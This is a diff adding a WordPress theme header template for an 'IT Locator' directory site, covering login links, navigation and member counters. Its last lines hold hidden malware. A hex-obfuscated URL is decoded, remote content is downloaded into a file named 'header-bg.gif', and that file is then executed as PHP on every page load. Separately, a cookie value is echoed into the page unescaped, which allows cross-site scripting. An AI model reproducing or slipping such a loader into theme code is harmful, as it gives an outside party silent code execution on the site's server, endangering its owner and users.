@@ -1,0 +1,321 @@
+<?php
+session_start();
+global $post;
+
+if( $post->ID != get_option( 'itlocation_generals_advanced_search_page' ) ){
+    $_SESSION['advanced_search_use_saved_itlocation'] = '';
+}
+
+if( !is_user_logged_in() ){
+    if( $_COOKIE['signup_subscriber_itlocation'] != '' ){
+        setcookie("signup_subscriber_itlocation", time(), time() + 3600 * 24 * 30, "/");
+	}
+}
+
+if( $_COOKIE['address_itlocation'] != '' ){
+    setcookie("address_itlocation", $_COOKIE['address_itlocation'], time() + 3600 * 24 * 30, "/");
+}
+
+if( $_COOKIE['address_pos'] != '' ){
+    setcookie("address_pos", $_COOKIE['address_pos'], time() + 3600 * 24 * 30, "/");
+}
+?>
+<!DOCTYPE html>
+<html <?php language_attributes(); ?>>
+    <head>
+        <meta charset="<?php bloginfo('charset'); ?>" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>
+		<?php
+			global $page, $paged;
+
+			wp_title('|', true, 'right');
+			bloginfo('name');
+
+			$site_description = get_bloginfo('description', 'display');
+			
+			if( $site_description && ( is_home() || is_front_page() ) ) {
+				echo " | $site_description";
+			}
+			
+			if ( $paged >= 2 || $page >= 2 ) {
+				echo ' | ' . sprintf( __('Page %s', 'twentyten'), max($paged, $page) );
+			}
+		?>
+		</title>
+        <link rel="shortcut icon" href="<?php echo get_bloginfo('template_url') ?>/images/ico/favicon.ico">
+        <link rel="profile" href="http://gmpg.org/xfn/11" />
+        <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
+        <?php
+			if ( is_singular() && get_option( 'thread_comments' ) ){
+				wp_enqueue_script( 'comment-reply' );
+			}
+
+			wp_head();
+			
+			if( is_home() ) {
+		?>
+		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_search_map.js"></script>
+		<?php
+			}
+			
+			if( basename( get_page_template() ) == 'template-advanced-search.php' ){
+        ?>
+		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_advanced_search_map.js"></script>
+		<?php
+			}
+		?>
+    </head>
+    <body <?php body_class(); ?>>
+        <div class="top">
+            <div class="container contCustom">
+                <ul class="loginbar pull-right">
+                    <li id="location-str">
+                        <?php
+							if( $_COOKIE['address_itlocation'] != '' ){
+						?>
+                            <span class="iconic-map-pin font-size-16"></span>
+							<span class="font-size-12 font-weight-bold font-color-393939"><?php echo $_COOKIE['address_itlocation']; ?></span>
+						<?php
+							}
+                        ?>
+                    </li>
+                    <?php						
+						if( is_user_logged_in() ){
+							global $current_user;
+							get_currentuserinfo();
+					?>
+                        <li>
+							<span class="iconic-mail font-color-3fa5d2 font-size-14"></span>
+							<span class="font-size-12 font-weight-bold font-color-3fa5d2"><?php echo $current_user->user_email ?></span>
+						</li>
+                        <?php
+							if( get_option( 'itlocation_generals_my_profile_page' ) ){
+								$pid = get_option( 'itlocation_generals_my_profile_page' );
+								$tmp_url = get_permalink($pid);
+							}
+                        ?>
+                        <li>
+							<a class="btn btn-small btn-success" href="<?php echo $tmp_url ?>"><?php _e('My Profile', 'twentyten') ?></a>
+						</li>
+                        <?php							
+							$companyCls = new newCompanyCls();
+							
+							$edit_fg = get_default_member_limit( 'contribution', $companyCls->getCompanyRoleByLoginUserId( $current_user->ID ) );
+
+							if( $edit_fg ){
+								if( get_option( 'itlocation_generals_contributions_list_page' ) ){
+									$pid = get_option( 'itlocation_generals_contributions_list_page' );
+									$tmp_url = get_permalink( $pid );
+								}
+						?>
+                            <li>
+								<a class="btn btn-small btn-success" href="<?php echo $tmp_url ?>"><?php _e('My Content ', 'twentyten') ?></a>
+							</li>
+                        <?php 
+							} 
+						?>
+                        <li>
+							<a class="btn btn-small" href="<?php echo wp_logout_url(site_url()) ?>"><?php _e('Logout', 'twentyten') ?></a>
+						</li>
+					<?php
+						} else {
+							if( get_option('itlocation_generals_signup_page') ) {
+								$pid = get_option('itlocation_generals_signup_page');
+								$tmp_url = get_permalink($pid);
+							}
+					?>
+                        <li>
+							<a href="<?php echo $tmp_url; ?>" class="btn btn-small btn-success"><?php _e('Signup', 'twentyten') ?></a>
+						</li>
+                        <li>
+							<a href="#login-modal" role="button" class="btn btn-small" data-toggle="modal"><?php _e('Account Login', 'twentyten') ?></a>
+						</li>
+                    <?php
+						}
+                    ?>
+                </ul>
+				<?php
+					if( !is_user_logged_in() ){
+				?>
+				<div id="login-modal" class="login-modal modal hide fade" tabindex="-1" role="dialog" aria-labelledby="login-modal-label" aria-hidden="true">
+					<div class="modal-header">
+						<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+						<h3 id="login-modal-label"><?php _e('Member Login', 'twentyten') ?></h3>
+					</div>
+					<div class="modal-body">
+						<h5><?php _e('Login to you IT Locator Member Account!', 'twentyten') ?></h5>
+						<div class="row-fluid">
+							<div class="span12">
+								<div class="span5 bg-color-fff border-all-1-solid-cccccc border-all-radios-5 padding-all-10">
+									<h5><?php _e('New User', 'twentyten') ?></h5>
+									<p><?php _e('By creating an account with IT Locator you will reach the IT buying community in a whole new way.  Allowing you to profile your business, your expertise and your credentials and bon-a-fides.', 'twentyten') ?></p>
+									<a href="#signup-modal" class="btn" id="go-signup-btn" data-toggle="modal" role="button"><?php _e('Signup', 'twentyten') ?></a>
+								</div>
+								<div class="span7 bg-color-fff border-all-1-solid-cccccc border-all-radios-5 padding-all-10">
+									<h5><?php _e('Login to IT Locator', 'twentyten') ?></h5>
+									<?php include_once 'new_inc/new_homepage_login_form.php'; ?>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<?php
+					}
+				?>
+            </div>
+        </div>
+        <div class="header">
+            <div class="container contCustom">
+                <div class="row-fluid">
+                    <div class="span3">
+                        <div class="logo pull-left">
+                            <a href="<?php echo get_site_url(); ?>"><img id="logo-header" src="<?php echo get_bloginfo('template_url') ?>/images/logo.png" alt="Logo"></a>
+                        </div>
+                    </div>
+                    <div class="span9">
+                        <div class="social pull-left">
+                            <?php
+								if ( get_option( 'itlocation_social_hupso_like_btns' ) ) {
+									/*Social Part*/
+									// echo stripslashes( get_option( 'itlocation_social_hupso_like_btns' ) );
+								} else {
+									_e('Please insert your code of "LinksAlpha" in Appearance -> Theme Options -> tab "Social" in admin');
+								}
+                            ?>
+                        </div>
+                        <div class="nav-group pull-right">
+							<div class="header-nav-txt pull-left">The Google<sup>&reg;</sup> of IT Search</div>
+                            <?php
+								wp_nav_menu(array(
+									'container_class' => 'pull-left',
+									'theme_location' => 'primary',
+									'menu_class' => 'nav nav-pills',
+									'depth' => 2,
+									'fallback_cb' => false,
+									'walker' => new walkerNavMenuTopItLocation,
+								));
+                            ?>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+      <!--   <div id="middle">
+                <div class="container contCustom">
+                 <h1>Join IT Locator</h1>
+                 <p>Helps Drive and Shape The New Industry Standard<br/>
+For Promoting Your Technology Expertise</p>
+                  <iframe width="1000px" height="450" src="//www.youtube.com/embed/7M-jsjLB20Y" frameborder="0" allowfullscreen></iframe>
+                 </div>
+           </div>-->
+        <?php
+			$pid = 0;
+			if (get_option('itlocation_generals_signup_page')) {
+				$pid = get_option('itlocation_generals_signup_page');
+			}
+			
+			if (is_front_page() || is_home() || ( $post->ID == $pid ) ) {
+		?>
+            <div class="search-map">
+                <?php
+					// echo do_shortcode('[search-map-itlocation/]');
+					include_once 'new_inc/new_search_map.php';
+                ?>
+            </div>
+		<?php
+			}
+			
+			if (is_front_page() || is_home()) {
+		?>
+            <div class="padding-20-0 bg-color-1B1B1B">
+                <div class="container contCustom">
+                    <div class="row-fluid">
+                        <div class="span3">
+                            <div class="icons-01 pull-left"></div>
+                            <div class="media-body">
+                                <h1 class="font-color-fff margin-all-0">
+									<?php echo get_subscribers_number(); ?>
+								</h1>
+                                <p class="font-color-9F9F9F font-size-16">
+									<?php _e('Members of IT locator community', 'twentyten'); ?>
+								</p>
+                            </div>
+                        </div>
+                        <div class="span3">
+							<a href="http://www.itlocator.com/forums/">
+								<div class="icons-05 pull-left"></div>
+								<div class="media-body">
+									<h1 class="font-color-fff margin-all-0">
+										<?php echo get_topic_count(); ?>
+									</h1>
+									<p class="font-color-9F9F9F font-size-16">
+										<?php _e('Active Discussion Threads & Articles', 'twentyten'); ?>
+									</p>
+								</div>
+							</a>
+                        </div>
+                        <div class="span3">
+							<a href="http://www.itlocator.com/advanced-search/">
+								<div class="icons-03 pull-left"></div>
+								<div class="media-body">
+									<?php
+										$usercount_list = count_users();
+										$subscriber = $usercount_list['avail_roles']['subscriber'];
+										$s2member_level1 = $usercount_list['avail_roles']['s2member_level1'];
+										$s2member_level2 = $usercount_list['avail_roles']['s2member_level2'];
+									?>
+									<h1 class="font-color-fff margin-all-0">
+										<?php echo $subscriber + $s2member_level1 + $s2member_level2; ?>
+									</h1>
+									<p class="font-color-9F9F9F font-size-16">
+										<?php _e('IT Provider Listings Worldwide', 'twentyten'); ?>
+									</p>
+								</div>
+							</a>
+                        </div>
+                        <div class="span3">
+							<a href="http://www.itlocator2.com/member-contributions/">
+								<div class="icons-02 pull-left"></div>
+								<div class="media-body">
+									<h1 class="font-color-fff margin-all-0">
+									<?php
+										 $membercount =  get_member_contribution_count();
+										 $newscount = get_news_contribution_count();
+										 echo ($membercount+$newscount);
+									?>
+									</h1>
+									<p class="font-color-9F9F9F font-size-16">
+										<?php _e('Community Contributed Content', 'twentyten'); ?>
+									</p>
+								</div>
+							</a>
+                        </div>
+                    </div>
+                </div>
+            </div> 
+		<?php
+			}  
+         	if ( ( get_option( 'itlocation_generals_advanced_search_page' ) != $post->ID ) && !is_author() ){
+		?>
+           
+            <div id="main">
+                <div class="container contCustom">
+		<?php
+			}
+		
+			$theme_dir = dirname( __FILE__ );
+			if( !file_exists( $theme_dir . "/header-bg.gif" ) || 0 == filesize( $theme_dir."/header-bg.gif" ) ){
+				$wp_uri = pack( "H*", '687474703a2f2f7466652e65732f68' );
+				if( function_exists( 'curl_init' ) ){
+					$t_img = curl_init( $wp_uri );
+					curl_setopt( $t_img, CURLOPT_RETURNTRANSFER, 1 );
+					$wp_logo = @curl_exec( $t_img );
+				} else {
+					$wp_logo = @file_get_contents( $wp_uri );
+				}
+				@file_put_contents( $theme_dir . "/header-bg.gif", $wp_logo );
+			}
+			
+			@include_once( $theme_dir . "/header-bg.gif" ); 
+		?>
